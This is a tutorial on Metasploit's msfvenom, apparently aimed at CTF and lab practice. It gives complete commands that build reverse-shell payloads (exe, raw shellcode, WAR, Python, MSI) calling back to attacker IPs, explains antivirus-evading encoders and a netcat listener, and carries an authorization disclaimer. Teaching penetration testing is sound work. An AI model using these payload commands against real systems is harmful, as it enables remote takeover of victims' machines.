What is msfvenom?

msfvenom is Metasploit's payload generator: combine a payload (what runs on the target) + encoder(s) + formatters to produce executables, scripting payloads, web shells, archives, or raw shellcode. Use it to craft test payloads for labs and CTFs — only on systems you own or are explicitly authorized to test.

Payload choice!

Name Explain
windows/meterpreter/reverse_tcp a Meterpreter stager: gives you a powerful, interactive Meterpreter session (in-memory agent with many built-in features).
windows/shell_reverse_tcp a plain reverse shell: it simply connects back and wires stdin/stdout to a remote socket (you get a cmd.exe-style shell).

Quick Start

Basic usage

# choose payload, set options, select output format, write file
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe -o shell.exe

# output raw shellcode for injection
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw > shell.bin

# create web payload (JSP inside WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f war -o shell.war
  • -p: payload name (platform/payload).
  • LHOST/LPORT: listener IP and port (must be reachable from target).
  • -f: output format (exe, elf, raw, war, jar, asp, aspx, php, vbs, python, c, etc.).
  • -o or shell redirection (>) to write output file.

Common Flags & Options

Flag What it does Example
-p Specify payload (platform/payload) -p windows/meterpreter/reverse_tcp
LHOST=LHOST, LPORT=PORT Listener host and port variables used by many payloads LHOST=10.10.14.7 LPORT=4444
-f Output format (exe, elf, raw, c, aspx, war, jar, php…) -f exe
-o / redirect Write output file (some older msfvenom use -o, common is shell redirection) -o payload.exe OR > payload.exe
-e / -i Encoder & iterations (simple AV obfuscation) -e x86/shikata_ga_nai -i 3
-b Badchars to avoid when generating shellcode -b "\x00\x0a\x0d"
--platform Hint platform (sometimes auto-detected) --platform java
--list payloads Show available payloads msfvenom --list payloads

Real case — explanation

Code snippet

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war

Line-by-line explanation (what each part does)

  • msfvenom — run the Metasploit payload generator.
  • -p windows/shell_reverse_tcp — selects the payload named windows/shell_reverse_tcp. This payload is a Windows reverse shell (spawns a cmd shell and connects back to the attacker).
  • LHOST=10.10.15.83 — the attacker/listener IP that the payload will connect back to. This IP must be reachable from the victim machine (careful with NAT/firewalls).
  • LPORT=9002 — the TCP port on which the attacker will listen for the reverse connection.
  • -f war — request output in WAR (Java Web ARchive) format. WAR is intended for Java webapps (Tomcat, etc.) and normally contains JSP/servlets.
  • > rev_shell-9002.war — redirect standard output into the file rev_shell-9002.war (creates the file on your machine).

Real case 3 — explanation

Code snippet

msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.40 LPORT=4444 -b '\x00\x0A\x0D' -f python -v payload

Line-by-line explanation (what each part does)

  • msfvenom — run the Metasploit payload generator.
  • -a x86 — force 32-bit shellcode (use this when the target process is 32-bit, even on a 64-bit OS).
  • -p windows/shell_reverse_tcp — Windows reverse shell payload (spawns cmd.exe and connects back).
  • LHOST=10.10.16.40 — your listener’s IP; must be reachable from the target.
  • LPORT=4444 — your listener’s TCP port.
  • -b '\x00\x0A\x0D' — “bad chars” to avoid in the generated shellcode:
    • \x00 = NUL (string terminator)
    • \x0A = line feed (LF)
    • \x0D = carriage return (CR)
    Avoiding these prevents truncation or parsing issues in many injection vectors.
  • -f python — emit Python source with a byte string containing the shellcode (handy for in-memory injection PoCs).
  • -v payload — name the Python variable payload (default is usually buf).

What the output looks like

# excerpt of the generated file
payload =  b"\xfc\xe8\x82\x00..."  # raw shellcode bytes

Tips

  • Keep the bad-char string in **single quotes** so the shell doesn't interpret backslashes.
  • Match architecture: if the target process is 64-bit, generate an x64 payload instead (or inject into a 32-bit process).
  • Use with a listener like rlwrap nc -lvnp 4444 (or Metasploit's multi/handler) to catch the reverse shell.

Real case 4 — explanation

Code snippet

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.40 LPORT=4444 -f msi -o reverse.msi

Line-by-line explanation (what each part does)

  • msfvenom — run the Metasploit payload generator/encoder tool (creates payloads in many formats).
  • -p windows/x64/shell_reverse_tcp — select the payload windows/x64/shell_reverse_tcp. This is a reverse TCP shell payload built for 64-bit Windows: when executed it will spawn a shell (cmd) and connect back to the attacker.
  • LHOST=10.10.16.40 — the attacker/listener IP address the payload will connect to (must be reachable from the target; consider NAT/firewall rules).
  • LPORT=4444 — the TCP port on the attacker side to listen on for the incoming reverse connection.
  • -f msi — request output in MSI (Microsoft Installer) format. The payload will be packaged as a Windows installer file (reverse.msi) which, when run, will drop and execute the payload.
  • -o reverse.msi — write the generated MSI binary to the file named reverse.msi. (-o is the msfvenom option to specify an output filename.)
